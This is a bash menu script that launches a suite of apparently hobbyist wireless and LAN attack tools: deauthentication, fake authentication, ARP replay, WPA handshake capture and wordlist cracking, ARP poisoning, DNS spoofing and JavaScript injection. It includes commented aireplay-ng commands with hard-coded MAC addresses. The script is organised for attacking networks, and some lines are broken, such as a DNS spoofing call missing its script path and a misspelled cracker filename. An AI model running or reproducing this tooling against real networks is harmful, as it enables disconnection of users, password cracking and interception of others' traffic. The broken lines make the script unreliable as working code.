#!/bin/bash

while true; do
  echo "Main Menu:"
  echo "A. Basic Tools"
  echo "B. Pre-connection Attacks"
  echo "C. Post-connection Attacks"
  echo "E. Exit"

  read option

  case $option in

# A] Basic Tools
#  1] Mac Changer
#  2] Wireless Modes(Managed & Monitor)
#  3] All Wireless Network Details

    A)
      echo "Basic Tools: "
      while true; do
        echo "1. Mac Changer"
        echo "2. Wireless Modes(Managed & Monitor)"
        echo "3. Wifi Scan"
        echo "B. Back"

        read suboption

        case $suboption in
          1)
            echo "Mac Changer selected."
            read -p "Enter Interface: " interface
            read -p "Enter New Mac: " mac

            sudo python3 MacChanger/mac_changer.py -i $interface -m $mac
            ;;
          2)
            echo "Wireless Modes(Managed & Monitor) selected."
            read -p "Enter Interface: " interface
            read -p "Enter New Mode(Managed/Monitor): " mode

            sudo python3 WirelessMode/wireless_modes.py -i $interface -m $mode
            ;;
          3)
            echo "Wifi Scan selected."
            read -p "Enter Interface: " interface
            sudo python3 WifiScan/wifi_scan.py -i $interface
            ;;
          B)
            break
            ;;
          *)
            echo "Invalid option."
            echo "Try Again"
        esac
      done
      ;;

# B] Pre-connection Attacks
#  1] Packet Sniffer
#  2] Deatuthentication Attack
#  3] Fake Authentication Attack
#  4] ARP Request Replay Attack
#  5] Capturing the handshake
#  6] Cracking using wordlist

    B)
      echo "Pre-connection Attacks:"
      while true; do
        echo "1. All connected devices to that network"
        echo "2. Deatuthentication Attack"
        echo "3. Fake Authentication Attack"
        echo "4. ARP Request Replay Attack"
        echo "5. Capturing the handshake"
        echo "6. Cracking using wordlist"
        echo "B. Back"

        read suboption

        case $suboption in
          1)
            echo "All connected devices to that network selected."
            read -p "Name a Output file: " output
            read -p 'Enter Interface: ' interface
            read -p 'Enter BSSID of Network: ' bssid
            read -p 'Enter Channel of Network: ' channel

            sudo python3 PacketSniffer/network_clints.py -i $interface -b $bssid -c $channel -s $output
            ;;
          2)
            echo "Deatuthentication Attack selected."
            # sudo aireplay-ng --deauth 10000000 -a 42:A3:C3:D5:D7:0A -c 84:7B:57:C8:22:7E wlan1
            read -p "Enter Interface: " interface
            read -p "Enter BSSID of Network: " bssid
            read -p "Clint Mac Address: " mac

            sudo python3 DeauthAttack/deauth_attack.py -i $interface -b $bssid -m $mac
            ;;

          3)
            echo "Fake Authentication Attack selected."
            # aireplay-ng --fakeauth 0 -a 1A:0E:41:B6:48:E8 -h AC:15:A2:B6:76:BA wlan1

            read -p "Enter Interface: " interface
            read -p "Enter BSSID of Network: " bssid
            read -p "Enter Your Mac Address: " mac

            sudo python3 FakeAuthAttack/fakeauth.py -i $interface -b $bssid -m $mac
            ;;

          4)
            echo "ARP Request Replay Attack selected."

            read -p "Enter Interface: " interface
            read -p "Enter BSSID of Network: " bssid
            read -p "Enter Your Mac Address: " mac

            sudo python3 ARPReplayAttack/arpreplay.py -i $interface -b $bssid -m $mac 
            ;;
          5)
            echo "Capturing the handshake selected"
            echo "[+] Run Packet Sniffer and wait of any device connect to that network"
            echo "[+] either waiting you can try running deauthentication attack"
            echo "[+] On your Packer Sniffer the 3-way Handshake will capture"


            ;;
          6)
            echo "Cracking using wordlist selected"
            read -p "Enter WPA Handshake File(.cap file): " cap
            read -p "Enter Wordlist file: " list

            sudo python3 WordListCrack/carck.py -c $cap -w $list

            ;;
          B)
            break
            ;;
          *)
            echo "Invalid option."
            echo "Try Again"
        esac
      done
      ;;


# C] Post-connection Attacks
#  1] Discover all connected client
#  2] Sensitive Info about connected devices (eg: open ports, running services, operating system, etc)
#  3] ARP Poisoning
#  4] DNS Spoofing
#  5] Injecting Javascript Code

    C)
      echo "Post-connection Attacks: "
      while true; do
        echo "1. Discover all connected client"
        echo "2. Sensitive Info about connected devices (eg: open ports, running services, operating system, etc)"
        echo "3. ARP Poisoning"
        echo "4. DNS Spoofing"
        echo "5. Injecting Javascript Code"
        echo "6. ARP Spoofer Detector"
        echo "B. Back"

        read suboption

        case $suboption in
          1)
            echo "Discover all connected client selected."
            sudo python NetworkScanner/networkScanner.py
            ;;
          2)
            echo "Sensitive Info about connected devices (eg: open ports, running services, operating system, etc) selected."
            ;;
          3)
            echo "ARP Poisoning selected."
            read -p 'Enter target IP: ' ip
            sudo python ARPSpoofer/arpSpoof.py --ip $ip
            ;;
          4)
            echo "DNS Spoofing selected."
            read -p "Enter the Spoof IP address: " ip
            read -p "Enter the Target URL to spoof DNS: " target
            read -p "Enter the Spoof URL: " spoof

            sudo python --ip $ip -t $target -s $spoof

            ;;
          5)
            echo "Injecting Javascript Code selected."

            sudo python JSCodeInjector/codeInject.py 

            ;;

          6)
            echo "ARP Spoofer Detector"
            read -p 'Enter the interface: ' interface
            sudo python ARPSpooferDetector/detector.py -i $interface

            ;;
          B)
            break
            ;;
          *)
            echo "Invalid option."
            echo "Try Again"
        esac
      done
      ;;

# Exit

    E)
      echo "Exiting."
      exit 0
      ;;

    *)
      echo "Invalid option."
      echo "Try Again"
      ;;
  esac
done
